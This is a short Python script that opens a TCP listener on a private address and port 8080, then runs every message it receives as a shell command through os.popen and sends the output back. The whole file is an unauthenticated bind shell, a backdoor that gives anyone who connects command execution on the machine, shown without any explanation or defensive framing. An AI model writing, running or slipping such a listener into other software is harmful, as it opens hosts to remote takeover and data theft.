import socket
import os

sock = socket.socket()
sock.bind(('192.168.1.101', 8080))
sock.listen(2)
conn, addr = sock.accept()

print ('connected:', addr)

while True:
    data = conn.recv(1024)
    a = os.popen(data.decode()).read().encode()
    conn.send(a)
    #print(data.decode())
    if not data:
        break

conn.close()
